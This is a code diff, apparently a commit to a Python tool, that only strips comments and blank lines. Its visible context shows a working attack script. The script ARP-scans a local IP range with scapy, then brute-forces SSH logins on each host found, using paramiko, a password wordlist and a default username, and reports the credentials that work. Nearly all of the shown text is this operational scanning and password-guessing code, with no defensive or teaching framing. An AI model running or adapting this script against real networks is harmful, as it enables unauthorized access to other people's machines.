@@ -38,11 +38,10 @@ target_ip = input(f"[{stl.BLU}*{stl.RST}] IP range (192.168.0.0/24): ") or "192.
 port = int(input(f"[{stl.BLU}*{stl.RST}] Port (22): ") or 22)
 list = input(f"[{stl.BLU}*{stl.RST}] wordlist (funlist): ") or "funlist"
 username = input(f"[{stl.BLU}*{stl.RST}] username (h4x3r666): ") or "h4x3r666"
-
 wordlist = open(list)
 
 def scan(ip):
-    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")  # Get current timestamp
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     print(f"[{stl.BLU}*{stl.RST}] Starting ARP scan on {ip} : {port} with {username} & {list} at {stl.CYN}{timestamp}{stl.RST}\n")
     arp_request = scapy.ARP(pdst=ip)
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
@@ -69,7 +68,7 @@ def attempt_ssh_login(ip, port, username, password):
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     try:
         ssh.connect(ip, port, username, password)
-        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")  # Get current timestamp
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         print(f"[{stl.GRN}+{stl.RST}] Success! {stl.GRN}{username}{stl.RST} + {stl.GRN}{password}{stl.RST} logged in {ip}:{port} at {stl.CYN}{timestamp}{stl.RST}")
         ssh.close()
         return True
@@ -94,11 +93,9 @@ def display_results(results, port):
                     for password in wordlist.readlines():
                         password = password.strip("\n")
                         if attempt_ssh_login(ip, port, username, password):
-                            break  # Stop trying if a login is successful
+                            break
             except Exception as e:
                 print(f"[{stl.RED}-{stl.RST}] Error processing IP {ip}: {e}")
-
-
 
 scan_results = scan(target_ip)
 display_results(scan_results, port)
